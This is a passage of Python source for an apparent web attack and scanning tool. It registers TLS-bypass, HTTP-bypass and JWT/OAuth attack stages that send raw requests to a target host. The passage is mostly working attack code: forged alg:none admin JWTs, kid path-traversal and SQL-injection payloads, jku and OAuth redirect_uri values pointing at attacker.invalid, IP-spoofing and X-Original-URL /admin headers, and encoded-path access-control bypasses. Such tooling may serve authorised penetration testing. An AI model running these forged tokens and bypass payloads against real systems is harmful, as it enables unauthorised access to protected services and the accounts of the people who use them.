register_stage(StageSpec(6, "stage_06_tls_bypass", "TLS Bypass Techniques",
    "Tests server-side TLS parsing robustness and bypass surfaces: SNI variants "
    "(uppercase, trailing-dot, null-byte, leading-dot, omitted), GREASE, legacy versions, "
    "weak cipher groups, duplicate extensions, malformed extension lengths, past/future "
    "ClientHello randoms, RSA-only cipher sets, ECH GREASE, JA3 fingerprint matching.",
    [
        TestSpec("sni.case", "uppercase SNI", _stage06_sni_case, 10.0),
        TestSpec("sni.trailing_dot", "trailing-dot SNI", _stage06_sni_trailing_dot, 10.0),
        TestSpec("sni.null", "null-byte SNI", _stage06_sni_null, 10.0),
        TestSpec("sni.leading_dot", "leading-dot SNI", _stage06_sni_leading_dot, 10.0),
        TestSpec("sni.omit", "no-SNI handshake", _stage06_sni_omit, 10.0),
        TestSpec("tls.hello.grease", "GREASE injection", _stage06_grease, 12.0),
        TestSpec("tls.version.downgrade", "legacy version acceptance",
                 _stage06_version_downgrade, 25.0),
        TestSpec("tls.cipher.downgrade", "weak cipher downgrade",
                 _stage06_cipher_downgrade, 30.0),
        TestSpec("tls.hello.dup_ext", "duplicate extension", _stage06_dup_ext, 12.0),
        TestSpec("tls.hello.bad_ext_len", "malformed extension length",
                 _stage06_bad_ext_len, 12.0),
        TestSpec("tls.hello.random.past", "past-timestamped random",
                 _stage06_random_past, 10.0),
        TestSpec("tls.hello.random.future", "future-timestamped random",
                 _stage06_random_future, 10.0),
        TestSpec("tls.hello.rsa_kx", "RSA-only cipher negotiation",
                 _stage06_rsa_only, 12.0),
        TestSpec("ech.grease", "ECH GREASE extension", _stage06_ech_grease, 12.0),
        TestSpec("utls.ja3", "compute JA3 + profile matching", _stage06_ja3, 10.0),
    ], 300.0))


def _raw_http(host, port, request, timeout=4.0, use_tls=True, sni=None,
               max_bytes=65536):
    out = {"raw": b"", "bytes": 0, "status": None, "first_line": "",
           "headers": [], "body": b"", "error": "", "response_count": 0}
    s = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(timeout)
            raw.connect((host, port))
            count("connections")
            s = ctx.wrap_socket(raw, server_hostname=sni or host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            count("connections")
        s.sendall(request)
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
                if len(data) > max_bytes:
                    break
                if b"\r\n\r\n" in data:
                    cl = None
                    for line in data.split(b"\r\n"):
                        if line.lower().startswith(b"content-length:"):
                            try:
                                cl = int(line.split(b":", 1)[1].strip())
                            except Exception:
                                pass
                    if cl is None or (b"\r\n\r\n" in data and
                                       len(data.split(b"\r\n\r\n", 1)[1]) >= (cl or 0)):
                        break
            except socket.timeout:
                break
        out["raw"] = data
        out["bytes"] = len(data)
        out["response_count"] = data.count(b"HTTP/1.")
        head, _, body_b = data.partition(b"\r\n\r\n")
        out["body"] = body_b
        lines = head.split(b"\r\n")
        if lines:
            first = lines[0].decode("iso-8859-1", "replace")
            out["first_line"] = first
            parts = first.split(" ", 2)
            if len(parts) >= 2:
                try:
                    out["status"] = int(parts[1])
                except Exception:
                    pass
            for ln in lines[1:]:
                h, _, v = ln.decode("iso-8859-1", "replace").partition(":")
                out["headers"].append((h.strip(), v.strip()))
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


def _build_request(method, path, host_header, headers=None, body=b""):
    lines = ["%s %s HTTP/1.1" % (method, path),
             "Host: " + host_header,
             "User-Agent: srx87/1.0",
             "Accept: */*"]
    for k, v in (headers or []):
        lines.append("%s: %s" % (k, v))
    if body:
        lines.append("Content-Length: %d" % len(body))
    lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode("iso-8859-1", "replace") + body


def _stage07_header_case(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "mixed-case header names")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    results = {}
    variants = [
        ("all_lower", [("x-forwarded-for", "127.0.0.1")]),
        ("all_upper", [("X-FORWARDED-FOR", "127.0.0.1")]),
        ("mixed", [("X-fOrWaRdEd-FoR", "127.0.0.1")]),
    ]
    for label, headers in variants:
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage07.header_case.results", results)
    distinct = {v for v in results.values() if v}
    if len(distinct) > 1:
        emit_alert(emit, "warn", "server responds differently to header case")
        setk("vulnerability.header_case.detected", True)
    else:
        emit_alert(emit, "ok", "consistent response across header case variants")


def _stage07_dup_headers(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "duplicate Host and X-Forwarded-For headers")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    tests = {
        "dup_host": [("Host", "internal.local")],
        "dup_xff": [("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-For", "10.0.0.1")],
        "xff_comma": [("X-Forwarded-For", "127.0.0.1, 10.0.0.1")],
    }
    results = {}
    for label, headers in tests.items():
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s bytes=%d" % (r["status"], r["bytes"]),
                 OK if r["status"] and r["status"] < 500 else WARN)
    setk("stage07.header_duplicate.results", results)


def _stage07_ws_headers(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "leading/trailing whitespace in headers")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = {
        "space_before_colon": [("X-Forwarded-For ", "127.0.0.1")],
        "space_after_colon": [("X-Forwarded-For", " 127.0.0.1")],
        "trailing_space": [("X-Forwarded-For", "127.0.0.1 ")],
    }
    results = {}
    for label, headers in variants.items():
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage07.header_whitespace.results", results)


def _stage07_obs_fold(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "obs-fold continuation")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    raw = (("GET %s HTTP/1.1\r\n" % (target.path or "/")) +
           "Host: " + host_header + "\r\n" +
           "X-Forwarded-For: 1.2.3.4\r\n 127.0.0.1\r\n" +
           "Connection: close\r\n\r\n").encode("iso-8859-1")
    r = _raw_http(target.host, target.port, raw, timeout=4.0,
                   use_tls=use_tls, sni=target.host)
    setk("stage07.obs_fold.status", r["status"])
    emit_kv(emit, "status", str(r["status"]),
             OK if r["status"] and r["status"] < 500 else WARN)
    if r["status"] and r["status"] < 400:
        emit_alert(emit, "warn", "server accepted obs-fold continuation")
        setk("vulnerability.obs_fold.accepted", True)
    else:
        emit_alert(emit, "ok", "server rejected obs-fold")


def _stage07_null_header(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "null byte in header value")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    raw = (("GET %s HTTP/1.1\r\n" % (target.path or "/")) +
           "Host: " + host_header + "\r\n" +
           "X-Forwarded-For: 127.0.0.1\x00evil\r\n" +
           "Connection: close\r\n\r\n").encode("iso-8859-1")
    r = _raw_http(target.host, target.port, raw, timeout=4.0,
                   use_tls=use_tls, sni=target.host)
    setk("stage07.header_null.status", r["status"])
    emit_kv(emit, "status", str(r["status"]), VALUE)
    if r["status"] and r["status"] < 400:
        emit_alert(emit, "warn", "server accepted null byte in header value")
        setk("vulnerability.header_null.accepted", True)
    elif r["status"]:
        emit_alert(emit, "ok", "server rejected null-byte header")


def _stage07_unicode_header(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "UTF-8 encoded header value")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    raw = (("GET %s HTTP/1.1\r\n" % (target.path or "/")) +
           "Host: " + host_header + "\r\n" +
           "X-Test: café\r\n" +
           "Connection: close\r\n\r\n").encode("utf-8")
    r = _raw_http(target.host, target.port, raw, timeout=4.0,
                   use_tls=use_tls, sni=target.host)
    setk("stage07.header_unicode.status", r["status"])
    emit_kv(emit, "status", str(r["status"]), VALUE)
    if r["status"] and r["status"] < 400:
        emit_alert(emit, "info", "server accepted UTF-8 in header value")
    else:
        emit_alert(emit, "ok", "server rejected UTF-8 header value")


def _stage07_chunk_bad(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "malformed chunked bodies")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = {
        "missing_crlf": b"5\nhello\n0\n\n",
        "bad_hex": b"ZZ\r\nhello\r\n0\r\n\r\n",
        "negative": b"-5\r\nhello\r\n0\r\n\r\n",
    }
    results = {}
    for label, body in variants.items():
        raw = (("POST %s HTTP/1.1\r\n" % (target.path or "/")) +
               "Host: " + host_header + "\r\n" +
               "Transfer-Encoding: chunked\r\n" +
               "Connection: close\r\n\r\n").encode("iso-8859-1") + body
        r = _raw_http(target.host, target.port, raw, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        col = OK if r["status"] and r["status"] >= 400 else WARN if r["status"] else MUTED
        emit_kv(emit, label, "status=%s" % r["status"], col)
    setk("stage07.chunk_bad_len.results", results)
    accepted = [k for k, v in results.items() if v and v < 400]
    if accepted:
        emit_alert(emit, "warn",
                   "server accepted malformed chunks: " + ", ".join(accepted))
        setk("vulnerability.chunk_bad_len.detected", True)
    else:
        emit_alert(emit, "ok", "server rejected all malformed chunks")


def _stage07_path_double_slash(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "double/triple slash + backslash")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    path = target.path or "/"
    req = _build_request("GET", path, host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    base_status = base["status"]
    variants = {
        "double_slash": "//" + path.lstrip("/"),
        "triple_slash": "///" + path.lstrip("/"),
        "backslash": path.replace("/", "\\") if path != "/" else "\\",
    }
    results = {}
    for label, vpath in variants.items():
        req = _build_request("GET", vpath, host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = {"status": r["status"], "bytes": r["bytes"]}
        col = WARN if r["status"] and base_status and r["status"] == base_status else VALUE
        emit_kv(emit, label, "status=%s bytes=%d" % (r["status"], r["bytes"]), col)
    setk("stage07.path_double_slash.baseline", base_status)
    setk("stage07.path_double_slash.results", results)


def _stage07_path_trailing_dot(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "trailing dot / dot-slash / dot-dot-slash")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    path = target.path or "/"
    req = _build_request("GET", path, host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    base_status = base["status"]
    variants = {
        "trailing_dot": path + ".",
        "trailing_space": path + "%20",
        "dot_slash": "/./" + path.lstrip("/"),
        "dot_dot_slash": "/../" + path.lstrip("/"),
    }
    results = {}
    for label, vpath in variants.items():
        req = _build_request("GET", vpath, host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = {"status": r["status"], "bytes": r["bytes"]}
        col = WARN if r["status"] and base_status and r["status"] == base_status else VALUE
        emit_kv(emit, label, "status=%s bytes=%d" % (r["status"], r["bytes"]), col)
    setk("stage07.path_trailing_dot.results", results)
    bypass = [k for k, v in results.items()
              if v["status"] and base_status and v["status"] == base_status and "dot" in k]
    if bypass:
        emit_alert(emit, "warn",
                   "trailing-dot path bypass: " + ", ".join(bypass))
        setk("vulnerability.path_trailing_dot.detected", True)


def _stage07_path_semicolon(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "semicolon path parameters")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    path = target.path or "/"
    req = _build_request("GET", path, host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    base_status = base["status"]
    variants = {
        "semicolon_param": path + ";sessionid=xyz",
        "semicolon_dot": path + ";.css",
        "matrix_param": path + ";a=b;c=d",
    }
    results = {}
    for label, vpath in variants.items():
        req = _build_request("GET", vpath, host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = {"status": r["status"], "bytes": r["bytes"]}
        col = WARN if r["status"] and base_status and r["status"] == base_status else VALUE
        emit_kv(emit, label, "status=%s bytes=%d" % (r["status"], r["bytes"]), col)
    setk("stage07.path_semicolon.results", results)


def _stage07_path_url_encode(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "single/double/triple URL encoding")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = {
        "single_slash": "/%2fadmin",
        "double_slash": "/%252fadmin",
        "triple_slash": "/%25252fadmin",
        "single_dot": "/%2e/admin",
        "double_dot": "/%252e/admin",
        "mixed": "/%2e%2e/admin",
    }
    results = {}
    for label, vpath in variants.items():
        req = _build_request("GET", vpath, host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = {"status": r["status"], "bytes": r["bytes"]}
        emit_kv(emit, label, "status=%s bytes=%d" % (r["status"], r["bytes"]), VALUE)
    setk("stage07.path_url_encode.results", results)


def _stage07_overlong_utf8(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "overlong UTF-8 sequences in path")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    variants = {
        "overlong_slash": "/%c0%afadmin",
        "overlong_dot": "/%c0%ae%c0%ae/admin",
        "overlong_2": "/%c1%9cadmin",
    }
    results = {}
    for label, vpath in variants.items():
        req = _build_request("GET", vpath, host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage07.path_overlong_utf8.results", results)
    hits = [k for k, v in results.items() if v and v < 400]
    if hits:
        emit_alert(emit, "warn", "overlong UTF-8 accepted: " + ", ".join(hits))
        setk("vulnerability.path_overlong_utf8.detected", True)


def _stage07_method_override(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "X-HTTP-Method-Override")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    req = _build_request("GET", target.path or "/", host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    base_status = base["status"]
    variants = {
        "override_delete": [("X-HTTP-Method-Override", "DELETE")],
        "override_put": [("X-HTTP-Method-Override", "PUT")],
        "x_method": [("X-Method-Override", "DELETE")],
    }
    results = {}
    for label, headers in variants.items():
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        col = WARN if r["status"] and base_status and r["status"] != base_status else VALUE
        emit_kv(emit, label, "status=%s" % r["status"], col)
    setk("stage07.method_override.results", results)


def _stage07_method_case(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "method case variants")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    results = {}
    for method in ["GET", "get", "Get", "gEt"]:
        req = _build_request(method, target.path or "/", host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[method] = r["status"]
        emit_kv(emit, method, "status=%s" % r["status"], VALUE)
    setk("stage07.method_case.results", results)


def _stage07_method_body(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "_method body parameter")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    bodies = {
        "form_method": b"_method=DELETE",
        "form_method_put": b"_method=PUT",
        "json_method": b'{"_method":"DELETE"}',
    }
    results = {}
    for label, body in bodies.items():
        ct = "application/x-www-form-urlencoded" if b"_method=" in body else "application/json"
        req = _build_request("POST", target.path or "/", host_header,
                              [("Content-Type", ct)], body)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage07.method_body.results", results)


def _stage07_forwarded_chain(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "IP / host header chains")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    host_header = _current_host_header()
    req = _build_request("GET", target.path or "/", host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    base_status = base["status"]
    base_bytes = base["bytes"]
    header_sets = {
        "xff_loopback": [("X-Forwarded-For", "127.0.0.1")],
        "xff_local_10": [("X-Forwarded-For", "10.0.0.1")],
        "x_real_ip": [("X-Real-IP", "127.0.0.1")],
        "x_originating": [("X-Originating-IP", "127.0.0.1")],
        "x_client_ip": [("X-Client-IP", "127.0.0.1")],
        "forwarded_rfc7239": [("Forwarded", "for=127.0.0.1")],
        "x_forwarded_host": [("X-Forwarded-Host", "internal.local")],
        "x_original_url": [("X-Original-URL", "/admin")],
        "x_rewrite_url": [("X-Rewrite-URL", "/admin")],
    }
    results = {}
    for label, headers in header_sets.items():
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        changed = (r["status"] != base_status or abs(r["bytes"] - base_bytes) > 128)
        results[label] = {"status": r["status"], "bytes": r["bytes"], "changed": changed}
        col = WARN if changed else VALUE
        emit_kv(emit, label,
                 "status=%s bytes=%d changed=%s" % (r["status"], r["bytes"], changed), col)
    setk("stage07.ip_forwarded_chain.baseline",
         {"status": base_status, "bytes": base_bytes})
    setk("stage07.ip_forwarded_chain.results", results)
    hits = [k for k, v in results.items() if v["changed"]]
    if hits:
        emit_alert(emit, "warn",
                   "IP/host header changes response: " + ", ".join(hits))
        setk("vulnerability.ip_forwarded_chain.detected", True)


register_stage(StageSpec(7, "stage_07_http_bypass", "HTTP Bypass Techniques",
    "Tests HTTP-layer bypass surfaces with real raw requests: header case, duplicate "
    "Host/XFF, whitespace, obs-fold, null bytes, UTF-8 values, malformed chunks, path "
    "case, double/triple slash, backslash, trailing dots, semicolon params, URL encoding, "
    "overlong UTF-8, method override, method case, _method body, forwarded header chains.",
    [
        TestSpec("http.header.case", "mixed-case headers", _stage07_header_case, 15.0),
        TestSpec("http.header.duplicate", "duplicate headers",
                 _stage07_dup_headers, 15.0),
        TestSpec("http.header.whitespace", "header whitespace",
                 _stage07_ws_headers, 15.0),
        TestSpec("http.header.obs_fold", "obs-fold", _stage07_obs_fold, 12.0),
        TestSpec("http.header.null", "null byte in header", _stage07_null_header, 12.0),
        TestSpec("http.header.unicode", "UTF-8 header value",
                 _stage07_unicode_header, 12.0),
        TestSpec("http.chunk.bad_len", "malformed chunk bodies",
                 _stage07_chunk_bad, 15.0),
        TestSpec("http.path.double_slash", "double/triple slash",
                 _stage07_path_double_slash, 20.0),
        TestSpec("http.path.trailing_dot", "trailing dot / dot slash",
                 _stage07_path_trailing_dot, 20.0),
        TestSpec("http.path.semicolon", "semicolon path params",
                 _stage07_path_semicolon, 20.0),
        TestSpec("http.path.url_encode", "URL encoding",
                 _stage07_path_url_encode, 20.0),
        TestSpec("http.path.overlong_utf8", "overlong UTF-8",
                 _stage07_overlong_utf8, 15.0),
        TestSpec("http.method.override", "method override header",
                 _stage07_method_override, 20.0),
        TestSpec("http.method.case", "method case variants",
                 _stage07_method_case, 15.0),
        TestSpec("http.method.body", "_method body param",
                 _stage07_method_body, 15.0),
        TestSpec("http.ip.forwarded_chain", "XFF/Real-IP/Forwarded",
                 _stage07_forwarded_chain, 45.0),
    ], 300.0))


def _jwt_b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _jwt_b64url_decode(s):
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _jwt_build(header, payload, signature=b""):
    h = _jwt_b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _jwt_b64url_encode(signature) if signature else ""
    return "%s.%s.%s" % (h, p, s)


def _jwt_alg_none(payload=None):
    if payload is None:
        payload = {"sub": "admin", "role": "admin", "iat": int(time.time()),
                   "exp": int(time.time()) + 3600}
    header = {"alg": "none", "typ": "JWT"}
    h = _jwt_b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return "%s.%s." % (h, p)


def _jwt_with_rsa_pubkey(n, e, payload):
    header = {"alg": "HS256", "typ": "JWT"}
    try:
        pub_der = RSA.construct((n, e)).export_key(format="DER")
    except Exception:
        return _jwt_build(header, payload)
    msg = (_jwt_b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
           _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode()))
    h = HASHHMAC.new(pub_der, msg.encode(), SHA256)
    return msg + "." + _jwt_b64url_encode(h.digest())


def _jwt_with_kid(kid, payload=None):
    if payload is None:
        payload = {"sub": "admin", "role": "admin"}
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    msg = (_jwt_b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
           _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode()))
    if _HAS_CRYPTO:
        h = HASHHMAC.new(b"secret", msg.encode(), SHA256)
        return msg + "." + _jwt_b64url_encode(h.digest())
    return msg + "."


def _jwt_with_jku(jku, payload=None):
    if payload is None:
        payload = {"sub": "admin", "role": "admin"}
    header = {"alg": "RS256", "typ": "JWT", "jku": jku, "kid": "attacker-key"}
    return _jwt_build(header, payload, b"\x00" * 256)


def _auth_header_send(host, port, path, hname, hvalue, timeout=4.0,
                       use_tls=True, sni=None):
    host_header = _current_host_header()
    req_lines = ["GET %s HTTP/1.1" % path,
                 "Host: " + host_header,
                 "User-Agent: srx87/1.0",
                 "%s: %s" % (hname, hvalue),
                 "Connection: close", "", ""]
    raw = "\r\n".join(req_lines).encode("iso-8859-1", "replace")
    return _raw_http(host, port, raw, timeout=timeout, use_tls=use_tls, sni=sni)


def _stage08_alg_none(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "forging alg:none JWT and sending as Authorization: Bearer")
    token = _jwt_alg_none()
    setk("stage08.jwt_alg_none.token", token)
    emit_kv(emit, "token_len", str(len(token)), BRAND)
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=4.0,
                              use_tls=use_tls, sni=target.host)
    r = _auth_header_send(target.host, target.port, target.path or "/",
                           "Authorization", "Bearer " + token, timeout=4.0,
                           use_tls=use_tls, sni=target.host)
    differs = (base["status"] != r["status"] or abs(r["bytes"] - base["bytes"]) > 128)
    setk("stage08.jwt_alg_none.baseline_status", base["status"])
    setk("stage08.jwt_alg_none.response_status", r["status"])
    setk("stage08.jwt_alg_none.response_differs", differs)
    emit_kv(emit, "baseline_status", str(base["status"]), VALUE)
    emit_kv(emit, "with_jwt_status", str(r["status"]),
             WARN if differs else VALUE)
    if differs and r["status"] and r["status"] < 400:
        emit_alert(emit, "vuln", "server accepted alg:none JWT")
        count("vulns")
        setk("vulnerability.jwt_alg_none.detected", True)
    else:
        emit_alert(emit, "ok", "server rejected alg:none JWT")


def _stage08_kid_traversal(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "JWT with kid pointing at /dev/null and traversal")
    tokens = {
        "dev_null": _jwt_with_kid("/dev/null"),
        "traversal": _jwt_with_kid("../../../../etc/passwd"),
    }
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=4.0,
                              use_tls=use_tls, sni=target.host)
    results = {}
    for label, token in tokens.items():
        r = _auth_header_send(target.host, target.port, target.path or "/",
                               "Authorization", "Bearer " + token, timeout=4.0,
                               use_tls=use_tls, sni=target.host)
        differs = (base["status"] != r["status"] or abs(r["bytes"] - base["bytes"]) > 128)
        results[label] = {"status": r["status"], "differs": differs}
        col = DANGER if differs and r["status"] and r["status"] < 400 else VALUE
        emit_kv(emit, label, "status=%s differs=%s" % (r["status"], differs), col)
    setk("stage08.jwt_kid_traversal.results", results)


def _stage08_kid_sqli(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "JWT with SQL injection in kid")
    payloads = {
        "or_1_1": "' OR '1'='1",
        "union": "' UNION SELECT 1,1,1--",
        "comment": "x' OR 1=1-- ",
    }
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=4.0,
                              use_tls=use_tls, sni=target.host)
    results = {}
    for label, kid in payloads.items():
        token = _jwt_with_kid(kid)
        r = _auth_header_send(target.host, target.port, target.path or "/",
                               "Authorization", "Bearer " + token, timeout=4.0,
                               use_tls=use_tls, sni=target.host)
        differs = (base["status"] != r["status"] or abs(r["bytes"] - base["bytes"]) > 128)
        results[label] = {"status": r["status"], "differs": differs}
        col = DANGER if differs and r["status"] and r["status"] < 400 else VALUE
        emit_kv(emit, label, "status=%s differs=%s" % (r["status"], differs), col)
    setk("stage08.jwt_kid_sqli.results", results)


def _stage08_jku_ssrf(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "JWT with jku pointing at attacker JWKS")
    jku_urls = {
        "attacker": "https://attacker.invalid/jwks.json",
        "localhost": "https://127.0.0.1:8443/jwks.json",
    }
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=4.0,
                              use_tls=use_tls, sni=target.host)
    results = {}
    for label, jku in jku_urls.items():
        token = _jwt_with_jku(jku)
        t0 = time.time()
        r = _auth_header_send(target.host, target.port, target.path or "/",
                               "Authorization", "Bearer " + token, timeout=5.0,
                               use_tls=use_tls, sni=target.host)
        elapsed_ms = (time.time() - t0) * 1000
        results[label] = {"status": r["status"], "elapsed_ms": elapsed_ms}
        col = WARN if elapsed_ms > 1500 else VALUE
        emit_kv(emit, label,
                 "status=%s elapsed=%.0fms" % (r["status"], elapsed_ms), col)
    setk("stage08.jwt_jku_ssrf.results", results)
    slow = [k for k, v in results.items() if v["elapsed_ms"] > 1500]
    if slow:
        emit_alert(emit, "warn",
                   "jku fetch caused delay (SSRF signal): " + ", ".join(slow))


def _stage08_exp_missing(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "expired / far-future exp claims")
    now = int(time.time())
    tokens = {
        "expired": _jwt_alg_none({"sub": "admin", "exp": now - 86400}),
        "far_future": _jwt_alg_none({"sub": "admin", "exp": now + 10 * 365 * 86400}),
    }
    results = {}
    for label, token in tokens.items():
        r = _auth_header_send(target.host, target.port, target.path or "/",
                               "Authorization", "Bearer " + token, timeout=4.0,
                               use_tls=use_tls, sni=target.host)
        results[label] = r["status"]
        emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage08.jwt_exp_missing.results", results)


def _stage08_oauth_redirect(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "OAuth redirect_uri reflection")
    paths = ["/oauth/authorize", "/oauth2/authorize", "/authorize", "/auth/authorize"]
    payloads = [
        "https://attacker.invalid/cb",
        "https://" + target.host + ".attacker.invalid/cb",
        "https://" + target.host + "@attacker.invalid/cb",
    ]
    hits = []
    for p in paths:
        for pl in payloads:
            url = "%s?response_type=code&client_id=test&redirect_uri=%s" % (p, pl)
            r = _auth_header_send(target.host, target.port, url, "X-Test", "1",
                                   timeout=3.0, use_tls=use_tls, sni=target.host)
            if r["status"] and 300 <= r["status"] < 400:
                for k, v in r["headers"]:
                    if k.lower() == "location" and "attacker.invalid" in v:
                        hits.append({"path": p, "redirect_uri": pl, "location": v})
                        emit_kv(emit, p, "→ " + v[:80], DANGER)
                        break
    setk("stage08.oauth_redirect.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "OAuth redirect_uri reflects external host: %d hits" % len(hits))
        count("vulns")
        setk("vulnerability.oauth_redirect.detected", True)
    else:
        emit_alert(emit, "ok", "no OAuth redirect_uri bypass detected")


def _stage08_path_override(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "X-Original-URL / X-Rewrite-URL override headers")
    variants = {
        "x_original_url": [("X-Original-URL", "/admin")],
        "x_rewrite_url": [("X-Rewrite-URL", "/admin")],
        "x_override_url": [("X-Override-URL", "/admin")],
        "x_forwarded_url": [("X-Forwarded-URL", "/admin")],
    }
